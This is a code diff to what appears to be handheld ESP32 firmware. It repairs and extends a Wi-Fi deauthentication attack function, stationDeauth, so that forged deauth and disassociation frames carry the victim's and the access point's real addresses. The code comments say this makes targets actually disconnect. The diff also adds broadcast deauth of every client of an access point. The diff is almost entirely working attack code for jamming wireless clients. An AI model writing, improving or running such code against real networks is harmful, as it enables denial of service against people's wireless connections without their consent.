@@ -180,21 +180,29 @@ const uint8_t* getDeauthReasons(int band, int* count) {
     return DEAUTH_REASONS;
 }
 
-int getAPChannel(const uint8_t *target_bssid) {
+// Returns the channel of target_bssid. If `found` is provided, it is set to true only
+// when target_bssid actually matched an AP in the scan (so callers can tell an AP MAC
+// apart from a client MAC that just falls back to the current channel).
+int getAPChannel(const uint8_t *target_bssid, bool *found = nullptr) {
     static unsigned long cache_time = 0;
     static uint8_t cached_bssid[6] = {0};
     static int cached_channel = 0;
+    static bool cached_found = false;
+    if (found) *found = false;
     if (cache_time > 0 && millis() - cache_time < 5000) {
         if (macCompare(cached_bssid, target_bssid)) {
+            if (found) *found = cached_found;
             return cached_channel;
         }
     }
     int found_channel = 0;
+    bool matched = false;
     int numNetworks = WiFi.scanNetworks(false, false);
     for (int i = 0; i < numNetworks; i++) {
         uint8_t *bssid_ptr = WiFi.BSSID((uint8_t)i);
         if (macCompare(bssid_ptr, target_bssid)) {
             found_channel = WiFi.channel((uint8_t)i);
+            matched = true;
             break;
         }
     }
@@ -205,7 +213,9 @@ int getAPChannel(const uint8_t *target_bssid) {
     }
     memcpy(cached_bssid, target_bssid, 6);
     cached_channel = found_channel;
+    cached_found = matched;
     cache_time = millis();
+    if (found) *found = matched;
     return found_channel;
 }
 
@@ -283,15 +293,55 @@ void sendDeauthToAP(APInfo& ap, const uint8_t* targetMAC, bool enhanced_mode, in
     total_frames += 4;
 }
 
-void stationDeauth(Host host) {
+void stationDeauth(Host host, const uint8_t *apBssidIn) {
     WiFiState savedState = saveWiFiState();
-    uint8_t targetMAC[6];
-    stringToMAC(host.mac.c_str(), targetMAC);
-    if (isMACZero(targetMAC)) {
+    uint8_t hostMAC[6];
+    stringToMAC(host.mac.c_str(), hostMAC);
+    if (isMACZero(hostMAC)) {
         displayError("Invalid MAC address", true);
         return;
     }
-    int channel = getAPChannel(targetMAC);
+
+    // Resolve the two addresses a valid deauth needs: the client (frame RA/destination)
+    // and the BSSID of the AP it is associated with (frame TA + addr3). Reusing the same
+    // MAC for all three fields (the previous behavior) produced frames that both the AP
+    // and the client silently drop, which is why targets kept "receiving" packets without
+    // ever disconnecting.
+    uint8_t targetMAC[6];   // client / destination (broadcast when the client is unknown)
+    uint8_t apBSSID[6];     // AP the client is associated with (source / addr3)
+    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+    int channel = 0;
+
+    if (apBssidIn != nullptr && !isMACZero(apBssidIn)) {
+        // Caller supplied both the client and its AP (client picked from an AP's client list)
+        memcpy(targetMAC, hostMAC, 6);
+        memcpy(apBSSID, apBssidIn, 6);
+        channel = getAPChannel(apBSSID);
+    } else {
+        bool hostIsAP = false;
+        int hostChannel = getAPChannel(hostMAC, &hostIsAP);
+        if (hostIsAP) {
+            // host is itself an AP -> broadcast deauth to every client of that AP
+            memcpy(apBSSID, hostMAC, 6);
+            memcpy(targetMAC, broadcast_mac, 6);
+            channel = hostChannel;
+        } else {
+            // host is a station; target it through the AP we are currently associated with
+            uint8_t gw[6] = {0};
+            getGatewayMAC(gw);
+            if (!isMACZero(gw)) {
+                memcpy(apBSSID, gw, 6);
+                memcpy(targetMAC, hostMAC, 6);
+                channel = getAPChannel(apBSSID);
+            } else {
+                // No AP context available; fall back to broadcasting from the host MAC
+                memcpy(apBSSID, hostMAC, 6);
+                memcpy(targetMAC, broadcast_mac, 6);
+                channel = hostChannel;
+            }
+        }
+    }
+
     if (channel == 0) {
         displayError("Could not find target AP", true);
         return;
@@ -327,11 +377,10 @@ void stationDeauth(Host host) {
     uint8_t disassoc_ap_to_sta[26];
     uint8_t deauth_sta_to_ap[26];
     uint8_t disassoc_sta_to_ap[26];
-    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-    buildOptimizedDeauthFrame(deauth_ap_to_sta, targetMAC, targetMAC, targetMAC, 0x07, false);
-    buildOptimizedDeauthFrame(disassoc_ap_to_sta, targetMAC, targetMAC, targetMAC, 0x07, true);
-    buildOptimizedDeauthFrame(deauth_sta_to_ap, targetMAC, targetMAC, targetMAC, 0x07, false);
-    buildOptimizedDeauthFrame(disassoc_sta_to_ap, targetMAC, targetMAC, targetMAC, 0x07, true);
+    buildOptimizedDeauthFrame(deauth_ap_to_sta, targetMAC, apBSSID, apBSSID, 0x07, false);
+    buildOptimizedDeauthFrame(disassoc_ap_to_sta, targetMAC, apBSSID, apBSSID, 0x07, true);
+    buildOptimizedDeauthFrame(deauth_sta_to_ap, apBSSID, targetMAC, apBSSID, 0x07, false);
+    buildOptimizedDeauthFrame(disassoc_sta_to_ap, apBSSID, targetMAC, apBSSID, 0x07, true);
     drawMainBorderWithTitle("Station Deauth");
     tft.setTextSize(FP);
     padprintln("Trying to deauth one target.");
@@ -463,7 +512,7 @@ void stationDeauth(Host host) {
                 APInfo& current_ap = sameSSID_APs[ap_index % sameSSID_APs.size()];
                 buildOptimizedDeauthFrame(broadcast_frame, broadcast_mac, current_ap.bssid, current_ap.bssid, broadcast_reason, false);
             } else {
-                buildOptimizedDeauthFrame(broadcast_frame, broadcast_mac, targetMAC, targetMAC, broadcast_reason, false);
+                buildOptimizedDeauthFrame(broadcast_frame, broadcast_mac, apBSSID, apBSSID, broadcast_reason, false);
             }
             if (enhanced_mode) {
                 wifiRawTx(WIFI_IF_STA, broadcast_frame, 26);
@@ -1036,12 +1085,17 @@ void scanClientsOnAP(uint8_t* targetMAC, int channel) {
 
 void showClientSelectionForDeauth(const std::vector<Host>& clients, uint8_t* targetMAC, int channel) {
     options.clear();
-    
+
+    // Copy the AP BSSID so each client-deauth lambda carries it by value (the source
+    // buffer lives on a caller stack frame that may be gone by the time it runs).
+    uint8_t apBssid[6];
+    memcpy(apBssid, targetMAC, 6);
+
     if (!clients.empty()) {
         for (auto& client : clients) {
             String clientMac = client.mac;
             options.push_back({clientMac.c_str(), [=]() {
-                stationDeauth(client);
+                stationDeauth(client, apBssid);
             }});
         }
     }
